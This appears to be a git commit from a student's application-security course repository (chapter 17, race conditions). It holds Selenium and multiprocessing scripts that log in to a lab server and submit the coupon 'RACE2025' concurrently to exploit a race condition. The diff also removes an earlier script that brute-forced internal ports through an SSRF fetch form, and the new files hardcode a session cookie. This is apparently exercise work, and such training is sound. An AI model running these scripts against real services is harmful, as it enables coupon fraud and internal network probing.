47da54ce5feb63c62a97863f99d24eca153bb09f
elizar <elizar@abyss.wow>
2026-04-24 17:29:15 +0300

    Finished 17 chapter

--- AppSec/17_Race_Condition/par_rc.py
+++ AppSec/17_Race_Condition/par_rc.py
@@ -3,60 +3,89 @@ from selenium.webdriver.common.by import By
 from selenium.common.exceptions import NoSuchElementException, TimeoutException
 import time
 
-options = webdriver.ChromeOptions()
-options.add_argument('--headless')
-#options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+import multiprocessing
 
-# Настройки заголовков для всех запросов
-selenium_wire_options = {
-    'headers': {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        # Добавьте другие заголовки при необходимости
-        # 'Referer': 'http://example.com',
-        # 'Accept': 'image/webp,image/apng,image/*,*/*'
+
+#def sequential(calc, proc, driver):
+def sequential(calc, proc):
+    options = webdriver.ChromeOptions()
+    options.add_argument('--headless')
+    #options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+
+    # Настройки заголовков для всех запросов
+    selenium_wire_options = {
+        'headers': {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Cookie': 'session=eyJ1c2VybmFtZSI6InN0dWRlbnQifQ.aesYCw.e8w3f1FuOfJ2Bazh51i2rfk5bSo'
+            # Добавьте другие заголовки при необходимости
+            # 'Referer': 'http://example.com',
+            # 'Accept': 'image/webp,image/apng,image/*,*/*'
+        }
     }
-}
 
-driver = webdriver.Chrome(
-    options=options,
-    seleniumwire_options=selenium_wire_options
-)
+    driver = webdriver.Chrome(
+        options=options,
+        seleniumwire_options=selenium_wire_options
+    )
 
-html_form = """
-<form action="http://62.173.140.174:36103/fetch" method="POST">
-  <input type="text" id="url" name="url" class="form-control" placeholder="https://example.com/image.jpg" required="">
-  <button type="submit" class="btn">🚀 Fetch Image</button>
-</form>
-"""
+    html_form_in = """
+    <form method="post" action="http://62.173.140.174:36110/login">
+            <input id="username" name="username" value="student">
+            <input id="password" name="password" type="password" value="student">
+            <button type="submit">Войти</button>
+          </form>
+    """
+    driver.get("data:text/html;charset=utf-8," + html_form_in)
+    login = "student"
+    passw = "student"
+    try:
+        input_field = driver.find_element(By.ID, "username")
+        input_field.clear()
+        input_field.send_keys(login)
+        
+        input_field = driver.find_element(By.ID, "password")
+        input_field.clear()
+        input_field.send_keys(passw)
+        
+        # Нажимаем кнопку отправки
+        submit_btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Войти')]")
+        submit_btn.click()
+        # Ждём загрузки страницы (настройте под свой случай)
+        time.sleep(1)
+        # Получаем HTML текущей страницы
+        page_html = driver.page_source
+        # Выводим в консоль результат запроса
+        print(f"\n--- Результат для {login} ---")
+        print(page_html)
+        print("-" * 50)
+    except (NoSuchElementException, TimeoutException) as e:
+        print(f"Ошибка при обработке {login}: {e}")
+    except Exception as e:
+        print(f"Неожиданная ошибка для {login}: {e}")
+        
+    time.sleep(1)
 
-'''html_form = """
-<form action="http://62.173.140.174:36103/fetch" method="POST">
-  <input type="text" id="url" name="url" class="form-control" placeholder="https://example.com/image.jpg" required="">
-  <button type="submit" class="btn">🚀 Fetch Image</button>
-</form>
-<script>
-  document.forms[0].submit();
-</script>
-"""
-'''
-driver.get("data:text/html;charset=utf-8," + html_form)
+    html_form_coupon = """
+    <form method="post" action="http://62.173.140.174:36110/coupon">
+              <input id="code" name="code" type="text" placeholder="Введите промокод">
+              <button type="submit">Применить промокод</button>
+            </form>
+    """
+        
+    driver.get("data:text/html;charset=utf-8," + html_form_coupon)
 
-# Генерация URL: photot-5000, photot-5001, ...
-start_num = 5000
-end_num = 50000  # меняем на нужное конечное число
-
-for num in range(start_num, end_num + 1):
-    img_url = f"http://ssrf-server2:{num}/admin"
+    coupon = "RACE2025"
+    
     try:
         # Находим поле ввода и вставляем ссылку
-        input_field = driver.find_element(By.ID, "url")
+        input_field = driver.find_element(By.ID, "code")
         input_field.clear()
-        input_field.send_keys(img_url)
+        input_field.send_keys(coupon)
 
         # Нажимаем кнопку отправки
-        submit_btn = driver.find_element(By.CSS_SELECTOR, "button.btn")
+        submit_btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Применить промокод')]")
         submit_btn.click()
-
+        
         # Ждём загрузки страницы (настройте под свой случай)
         time.sleep(1)
 
@@ -64,23 +93,42 @@ for num in range(start_num, end_num + 1):
         page_html = driver.page_source
 
         # Выводим в консоль результат запроса
-        print(f"\n--- Результат для {img_url} ---")
+        print(f"\n--- Результат для {coupon} ---")
         print(page_html)
         print("-" * 50)
-        
-        with open('task11.txt', 'a', encoding='utf-8') as f:
-            f.write(f"\n--- Результат для {img_url} ---\n")
-            f.write(page_html)
-            f.write("\n" + "-" * 50 + "\n")
-
-        # Возвращаемся к форме для следующего запроса
-        driver.get("data:text/html;charset=utf-8," + html_form)
-        time.sleep(1)  # пауза между запросами
-
+            
     except (NoSuchElementException, TimeoutException) as e:
-        print(f"Ошибка при обработке {img_url}: {e}")
+        print(f"Ошибка при обработке {coupon}: {e}")
     except Exception as e:
-        print(f"Неожиданная ошибка для {img_url}: {e}")
+        print(f"Неожиданная ошибка для {coupon}: {e}")
+    
+#def processesed(procs, calc, driver):
+def processesed(procs, calc):
+    # procs - количество ядер
+    # calc - количество операций на ядро
+    processes = []
+    # делим вычисления на количество ядер
+    for proc in range(procs):
+        #p = multiprocessing.Process(target=sequential, args=(calc, proc, driver))
+        p = multiprocessing.Process(target=sequential, args=(calc, proc))
+        processes.append(p)
+        p.start()
+    # Ждем, пока все ядра 
+    # завершат свою работу.
+    for p in processes:
+        p.join()
+        
 
-# Закрываем браузер
-driver.quit()
+if __name__ == "__main__":      
+    
+    # узнаем количество ядер у процессора
+    n_proc = multiprocessing.cpu_count()
+    print(f"n_proc = ", n_proc)
+    # вычисляем сколько циклов вычислений будет приходится
+    # на 1 ядро, что бы в сумме получилось 80 или чуть больше
+    calc = 6 // n_proc + 1
+    #processesed(n_proc, calc, driver)
+    processesed(n_proc, calc)
+    
+    # Закрываем браузер
+    driver.quit()
---
+++ AppSec/17_Race_Condition/par_rc_ping.py
@@ -0,0 +1,102 @@
+from seleniumwire import webdriver  # Обратите внимание: seleniumwire, а не selenium
+from selenium.webdriver.common.by import By
+from selenium.common.exceptions import NoSuchElementException, TimeoutException
+import time
+        
+options = webdriver.ChromeOptions()
+options.add_argument('--headless')
+#options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+
+# Настройки заголовков для всех запросов
+selenium_wire_options = {
+    'headers': {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Cookie': 'session=eyJ1c2VybmFtZSI6InN0dWRlbnQifQ.aesYCw.e8w3f1FuOfJ2Bazh51i2rfk5bSo'
+        # Добавьте другие заголовки при необходимости
+        # 'Referer': 'http://example.com',
+        # 'Accept': 'image/webp,image/apng,image/*,*/*'
+    }
+}
+
+driver = webdriver.Chrome(
+    options=options,
+    seleniumwire_options=selenium_wire_options
+)
+
+html_form_in = """
+<form method="post" action="http://62.173.140.174:36110/login">
+        <input id="username" name="username" value="student">
+        <input id="password" name="password" type="password" value="student">
+        <button type="submit">Войти</button>
+      </form>
+"""
+driver.get("data:text/html;charset=utf-8," + html_form_in)
+login = "student"
+passw = "student"
+try:
+    input_field = driver.find_element(By.ID, "username")
+    input_field.clear()
+    input_field.send_keys(login)
+    
+    input_field = driver.find_element(By.ID, "password")
+    input_field.clear()
+    input_field.send_keys(passw)
+    
+    # Нажимаем кнопку отправки
+    submit_btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Войти')]")
+    submit_btn.click()
+    # Ждём загрузки страницы (настройте под свой случай)
+    time.sleep(1)
+    # Получаем HTML текущей страницы
+    page_html = driver.page_source
+    # Выводим в консоль результат запроса
+    print(f"\n--- Результат для {login} ---")
+    print(page_html)
+    print("-" * 50)
+except (NoSuchElementException, TimeoutException) as e:
+    print(f"Ошибка при обработке {login}: {e}")
+except Exception as e:
+    print(f"Неожиданная ошибка для {login}: {e}")
+    
+time.sleep(1)
+
+       
+html_form_coupon = """
+<form method="post" action="http://62.173.140.174:36110/coupon">
+          <input id="code" name="code" type="text" placeholder="Введите промокод">
+          <button type="submit">Применить промокод</button>
+        </form>
+"""
+        
+driver.get("data:text/html;charset=utf-8," + html_form_coupon)
+
+coupon = "RACE2025"
+
+try:
+    # Находим поле ввода и вставляем ссылку
+    input_field = driver.find_element(By.ID, "code")
+    input_field.clear()
+    input_field.send_keys(coupon)
+
+    # Нажимаем кнопку отправки
+    submit_btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Применить промокод')]")
+    submit_btn.click()
+    
+    # Ждём загрузки страницы (настройте под свой случай)
+    time.sleep(1)
+
+    # Получаем HTML текущей страницы
+    page_html = driver.page_source
+
+    # Выводим в консоль результат запроса
+    print(f"\n--- Результат для {coupon} ---")
+    print(page_html)
+    print("-" * 50)
+        
+except (NoSuchElementException, TimeoutException) as e:
+    print(f"Ошибка при обработке {coupon}: {e}")
+except Exception as e:
+    print(f"Неожиданная ошибка для {coupon}: {e}")
+
+# Закрываем браузер
+driver.quit()
